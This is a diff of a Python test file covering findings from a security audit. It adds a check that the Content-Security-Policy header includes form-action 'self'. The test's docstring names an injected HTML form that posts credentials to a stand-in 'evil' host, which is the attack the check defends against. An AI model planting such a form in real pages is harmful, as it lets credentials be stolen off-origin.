@@ -1,6 +1,6 @@
 """Tests for the infra/headers cluster of the 2026-05-13 security audit.
 
-Findings covered so far:
+Findings covered:
 
   * H-3  — `_limiter_storage_uri()` refuses to start on `memory://`
            outside an explicit dev / test opt-in.
@@ -9,6 +9,7 @@ Findings covered so far:
            Werkzeug ProxyFix on Scalingo.
   * H-13 — `secure_cookies` defaults to True; HSTS is decoupled from
            that flag and emitted whenever the request is secure.
+  * M-12 — CSP now includes `form-action 'self'`.
 """
 
 from __future__ import annotations
@@ -130,6 +131,20 @@ def test_gunicorn_conf_caps_request_line_and_field_size():
     conf = _load_gunicorn_conf()
     assert conf.limit_request_line >= 4096
     assert conf.limit_request_field_size >= 8192
+
+
+# ---------------------------------------------------------------------------
+# M-12 — CSP form-action lock
+# ---------------------------------------------------------------------------
+
+
+def test_csp_includes_form_action_self(client):
+    """Audit M-12: without `form-action 'self'`, an injected
+    `<form action="https://evil/">` would POST credentials off-origin
+    before any other defense layer could complain."""
+    resp = client.get("/")
+    csp = resp.headers.get("Content-Security-Policy", "")
+    assert "form-action 'self'" in csp, f"CSP must lock form action to self; got: {csp}"
 
 
 # ---------------------------------------------------------------------------
